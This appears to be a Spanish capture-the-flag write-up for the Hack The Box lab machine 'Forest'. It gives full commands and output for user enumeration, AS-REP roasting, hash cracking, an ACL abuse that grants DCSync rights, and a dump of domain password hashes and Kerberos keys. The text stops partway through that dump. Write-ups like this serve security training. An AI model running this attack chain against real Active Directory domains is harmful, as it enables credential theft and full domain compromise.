(SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/25%Time=5DB2843D%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-24T22:23:05-07:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-25 01:22:33 |_ start_date: 2019-10-25 00:22:54 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 1 04:31:58 2019 ========================== | Target Information | ========================== Target ........... 10.10.10.161 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.161 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ===================================== | Session Check on 10.10.10.161 | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server 10.10.10.161 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ===================================================== | Getting information via LDAP for 10.10.10.161 | ===================================================== [+] Long domain name for 10.10.10.161: htb.local [+] 10.10.10.161 appears to be a root/parent DC =========================================== | Getting domain SID for 10.10.10.161 | =========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: HTB Domain Sid: S-1-5-21-3072663084-364016917-1341370565 [+] Host is part of a domain (not a workgroup) ============================= | Users on 10.10.10.161 | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator\tName: Administrator\tDesc: Built-in account for administering the computer/domain index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy\tName: Andy Hislip\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1\tName: HealthMailbox-EXCH01-010\tDesc: (null) index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e\tName: HealthMailbox-EXCH01-003\tDesc: (null) index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678\tName: HealthMailbox-EXCH01-005\tDesc: (null) index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e\tName: HealthMailbox-EXCH01-009\tDesc: (null) index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781\tName: HealthMailbox-EXCH01-006\tDesc: (null) index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d\tName: HealthMailbox-EXCH01-004\tDesc: (null) index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64\tName: HealthMailbox-EXCH01-008\tDesc: (null) index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9\tName: HealthMailbox-EXCH01-002\tDesc: (null) index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722\tName: HealthMailbox-EXCH01-Mailbox-Database-1118319013\tDesc: (null) index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad\tName: HealthMailbox-EXCH01-001\tDesc: (null) index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238\tName: HealthMailbox-EXCH01-007\tDesc: (null) index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda\tName: Lucinda Berger\tDesc: (null) index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark\tName: Mark Brandt\tDesc: (null) index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi\tName: Santi Rodriguez\tDesc: (null) index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien\tName: Sebastien Caron\tDesc: (null) index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb\tName: Microsoft Exchange Migration\tDesc: (null) index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb\tName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\tDesc: (null) index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb\tName: Microsoft Exchange Approval Assistant\tDesc: (null) index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18\tName: Discovery Search Mailbox\tDesc: (null) index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a\tName: Microsoft Exchange\tDesc: (null) index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb\tName: E4E Encryption Store - Active\tDesc: (null) index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549\tName: Microsoft Exchange Federation Mailbox\tDesc: (null) index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b\tName: Microsoft Exchange\tDesc: (null) index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b\tName: Microsoft Exchange\tDesc: (null) index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco\tName: svc-alfresco\tDesc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] enum4linux complete on Fri Nov 1 04:32:35 2019   KERBEROS - impacket GetNPUsers Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.\nLista de Usuarios:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  Administrator Guest krbtgt DefaultAccount $331000-VK4ADACQNUCA SM_2c8eef0a09b545acb SM_ca8c2ed5bdab4dc9b SM_75a538d3025e4db9a SM_681f53d4942840e18 SM_1b41c9286325456bb SM_9b69f1b9d2cc45549 SM_7c96b981967141ebb SM_c75ee099d0a64c91b SM_1ffab36a2f5f479cb HealthMailboxc3d7722 HealthMailboxfc9daad HealthMailboxc0a90c9 HealthMailbox670628e HealthMailbox968e74d HealthMailbox6ded678 HealthMailbox83d6781 HealthMailboxfd87238 HealthMailboxb01ac64 HealthMailbox7108a4e HealthMailbox0659cc1 sebastien lucinda svc-alfresco andy mark santi   Ejecucion de script de impacket:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User HealthMailboxc3d7722 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxfc9daad doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxc0a90c9 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox670628e doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox968e74d doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox6ded678 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox83d6781 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxfd87238 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxb01ac64 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox7108a4e doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox0659cc1 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set   Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.\nHASHCAT - KERBEROs Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m 18200 pass_forest -o cracked.txt ../rockyou.txt --force hashcat (v5.1.0) starting... nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: ../rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7...6864af Time.Started.....: Fri Nov 1 02:46:04 2019 (2 secs) Time.Estimated...: Fri Nov 1 02:46:06 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2181.4 kH/s (9.63ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 4128768/14344385 (28.78%) Rejected.........: 0/4128768 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: s9039554h -\u0026gt; ruddsound1 Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Fri Nov 1 02:45:56 2019 Stopped: Fri Nov 1 02:46:07 2019   Pass:\n1  $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7a67d333b3d24$7b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice   SMBMAP Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.\nConfirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.\nUser svc-alfresco En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVILRM.\nEvil-RM: https://github.com/Hackplayers/evil-winrm\nInstall: gem install evil-winrm\nPRIVILEGE ESCALATION Utilizamos bloodhound.py para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.\nBooldhound.py Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.\nComprimimos los archivos en zip.\nBloodhound Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.\nNos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es Recehable High Values.\nPodemos ver que el usuario es miembro de varios grupos, y tiene permisos de WriteDACL, que le permiten al usuario modificar permisos de dominio en este caso htb.local y realizar operaciones en DCSync.\nBloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en Writedacl \u0026gt; Help \u0026gt; Abuse Info.\nACLPWN Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.\nRealizamos una busqueda del camino mas cercano:\nLos parametros:\n1 2 3 4 5 6 7 8  -f usuario/computadora (Es el nodo de inicio) -ft user (Especificamos que el nodo inicial es usuario/computadora/dominio/grupo) -t htb.local (El destino al cual deseamos llegar) -tt domain (Especificamos que el destino es usuario/computadora/dominio/grupo) -d htb.local (El Dominio) -du neo4j (Usuario para la base de datos) -dp toor (Contraseña para la base de datos) -dry (Especificamos que no deseamos atacar)   Podemos ver que encontro un camino y puede ser explotado.\n1 2 3 4 5 6 7 8 9 10 11  root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor [+] Path found! Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) [!] Unsupported operation: GetChanges on HTB.LOCAL (Domain) [-] Invalid path, skipping [+] Path found! Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) Please choose a path [0-1] 1 [+] Path validated, the following modifications are required for exploitation in the current configuration: [-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL [-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO   root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) [!] Unsupported operation: GetChanges on HTB.LOCAL (Domain) [-] Invalid path, skipping [+] Path found! Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) Please choose a path [0-1] 1 [-] Memberof -\u0026gt; continue [-] Memberof -\u0026gt; continue [-] Memberof -\u0026gt; continue [-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL [+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local [-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL [+] Re-bind successful [-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO [+] Dacl modification successful [+] Finished running tasks [+] Saved restore state to aclpwn-20191130-014547.restore Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101  root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a::: htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9::: htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555::: htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5::: htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff::: htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203::: htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355::: htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536::: htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 htb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4 htb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e htb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e htb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf htb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd htb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e htb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e htb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed htb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983 htb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91 htb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f htb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a htb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c htb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8 htb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d htb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81 htb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6 htb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5 